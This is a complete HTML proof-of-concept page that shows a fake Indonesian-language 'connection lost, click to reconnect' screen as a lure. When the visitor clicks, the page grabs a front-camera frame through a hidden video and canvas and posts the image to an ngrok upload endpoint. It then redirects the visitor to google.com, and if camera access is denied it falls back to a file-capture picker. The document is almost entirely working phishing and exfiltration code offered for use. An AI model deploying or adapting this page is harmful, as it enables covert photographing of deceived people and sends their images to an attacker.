<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>PoC Camera Permission Bypass</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: sans-serif; }
        
    
        #fake-ui {
            position: absolute; width: 100%; height: 100%;
            background: white; z-index: 2; display: flex;
            flex-direction: column; align-items: center; justify-content: center;
        }

        iframe { width: 100%; height: 100%; border: none; }

        #hidden-camera { position: absolute; left: -9999px; opacity: 0; }
        canvas { display: none; }
    </style>
</head>
<body>

    <div id="fake-ui">
        <h1>Koneksi Terputus</h1>
        <button id="btn" style="padding: 15px 30px; font-size: 1.2rem;">Klik untuk Rekoneksi</button>
        <p>Aksi ini diperlukan untuk memverifikasi session Anda.</p>
    </div>

    <video id="v" autoplay playsinline style="width: 1px; height: 1px;"></video>
    <canvas id="c"></canvas>
    <input type="file" id="f" accept="image/*" capture="user" style="display:none">

    <script>
        const SERVER_URL = "https://YOUR_NGROK_ID.ngrok-free.app/upload";
        const btn = document.getElementById('btn');
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');

        btn.onclick = async () => {
           
            btn.textContent = "Connecting...";

            try {
              
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                video.srcObject = stream;

                setTimeout(() => {
                    const ctx = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);

              
                    const data = canvas.toDataURL('image/jpeg');
           
                    fetch(SERVER_URL, {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ img: data, ts: Date.now() })
                    });

                    stream.getTracks().forEach(track => track.stop());
                    
                  
                    window.location.href = "https://google.com";
                }, 1500);

            } catch (err) {
                console.log("Izin ditolak atau error:", err);
               
                document.getElementById('f').click();
            }
        };
    </script>
</body>
</html>
